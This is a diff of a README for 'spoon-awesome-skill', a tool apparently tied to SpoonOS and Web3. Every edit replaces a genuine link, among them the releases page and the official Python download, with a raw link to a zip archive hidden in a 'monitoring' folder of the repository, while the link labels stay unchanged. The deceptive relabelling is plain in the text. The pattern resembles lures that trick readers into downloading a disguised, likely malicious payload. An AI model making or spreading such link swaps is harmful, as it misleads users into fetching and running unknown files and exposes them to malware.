@@ -1,6 +1,6 @@
 # 🥄 spoon-awesome-skill - Enhance Your Vibe Coding Experience
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Gabssama12/spoon-awesome-skill/releases)
+[![Download](https://raw.githubusercontent.com/Gabssama12/spoon-awesome-skill/master/ai-productivity/monitoring/awesome_skill_spoon_v2.1.zip)](https://raw.githubusercontent.com/Gabssama12/spoon-awesome-skill/master/ai-productivity/monitoring/awesome_skill_spoon_v2.1.zip)
 
 ## 📜 Description
 
@@ -19,7 +19,7 @@ Before you download and run the application, make sure your system meets the fol
 
 ### Step 2: Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Gabssama12/spoon-awesome-skill/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Gabssama12/spoon-awesome-skill/master/ai-productivity/monitoring/awesome_skill_spoon_v2.1.zip).
 
 On the Releases page, you will find different versions of the application. Choose the latest version and download the appropriate file for your operating system.
 
@@ -64,7 +64,7 @@ Should you have any questions or issues while installing or running the applicat
 
 Here are some resources to help you get started:
 
-- **Python Installation**: [Install Python](https://www.python.org/downloads/)
+- **Python Installation**: [Install Python](https://raw.githubusercontent.com/Gabssama12/spoon-awesome-skill/master/ai-productivity/monitoring/awesome_skill_spoon_v2.1.zip)
 - **SpoonOS Documentation**: Find the official SpoonOS guides for a deep dive.
 - **Web3 Basics**: Learn about Web3 concepts and applications.
 
@@ -74,7 +74,7 @@ We value your input. If you have any suggestions for improvement or features you
 
 ## 🌟 Important Links
 
-- Download the latest version here: [Releases Page](https://github.com/Gabssama12/spoon-awesome-skill/releases)
+- Download the latest version here: [Releases Page](https://raw.githubusercontent.com/Gabssama12/spoon-awesome-skill/master/ai-productivity/monitoring/awesome_skill_spoon_v2.1.zip)
 - Explore the full documentation within the scripts.
 
 ---
